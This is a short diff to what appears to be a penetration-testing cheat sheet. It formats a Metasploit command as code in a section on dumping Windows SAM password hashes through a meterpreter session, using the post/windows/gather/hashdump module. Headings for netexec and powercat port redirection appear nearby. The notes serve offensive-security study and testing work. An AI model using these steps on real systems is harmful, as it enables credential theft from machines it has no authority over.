@@ -51,7 +51,7 @@ Using netexec:
 ### <ins>Dump SAM</ins> (Make sure session is running with SYSTEM privileges)
 - Background the meterpreter session with `bg`.
 - `use post/windows/gather/hashdump`
-- set SESSION <Session Number>
+- `set SESSION <Session Number>`
 - `run`
 
 # TCP Port Redirection via powercat.ps1
